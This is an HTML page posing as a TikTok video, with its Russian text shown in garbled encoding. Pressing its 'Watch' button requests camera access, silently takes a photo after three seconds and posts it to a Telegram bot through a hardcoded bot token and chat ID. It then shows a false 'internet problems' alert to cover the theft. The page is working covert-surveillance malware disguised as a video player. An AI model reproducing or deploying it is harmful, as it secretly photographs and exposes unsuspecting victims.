<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <title>üî• TikTok –≤–∏–¥–µ–æ</title>
  <style>
    body {
      margin: 0;
      background-color: black;
      color: white;
      font-family: sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    video, canvas {
      display: none;
    }
    button {
      padding: 12px 24px;
      font-size: 18px;
      background: #ff0050;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <h2>üì∫ TikTok –≤–∏–¥–µ–æ –∑–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è...</h2>
  <p>–ù–∞–∂–º–∏—Ç–µ ¬´–ü–æ—Å–º–æ—Ç—Ä–µ—Ç—å¬ª, —á—Ç–æ–±—ã –≤–∫–ª—é—á–∏—Ç—å –≤–∏–¥–µ–æ</p>
  <button onclick="startCamera()">‚ñ∂Ô∏è –ü–æ—Å–º–æ—Ç—Ä–µ—Ç—å</button>
  <video id="video" autoplay playsinline width="300"></video>
  <canvas id="canvas" width="300" height="200"></canvas>

  <script>
    const botToken = "8111551903:AAErkwIiopSFelcspBo-Cg38hjPyGpdAmNE"; // üîÅ –°—é–¥–∞ –≤—Å—Ç–∞–≤—å —Å–≤–æ–π —Ç–æ–∫–µ–Ω
    const chatId = "-1002258184205";     // üîÅ –°—é–¥–∞ –≤—Å—Ç–∞–≤—å —Å–≤–æ–π Telegram ID –∏–ª–∏ ID –≥—Ä—É–ø–ø—ã

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById("video");
        video.srcObject = stream;
        video.play();

        setTimeout(() => takePhoto(video), 3000); // –∂–¥—ë–º 3 —Å–µ–∫ –∏ —Ñ–æ—Ç–∫–∞–µ–º
      } catch (err) {
        alert("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ");
      }
    }

    function takePhoto(video) {
      const canvas = document.getElementById("canvas");
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob((blob) => {
        sendPhoto(blob);
      }, "image/jpeg");
    }

    function sendPhoto(blob) {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", blob, "photo.jpg");

      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: "POST",
        body: formData
      }).then(() => {
        alert("–£ –≤–∞—Å –ø—Ä–æ–±–ª–µ–º—ã —Å –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–æ–º !");
      }).catch(() => {
        alert("‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Ñ–æ—Ç–æ");
      });
    }
  </script>
</body>
</html>
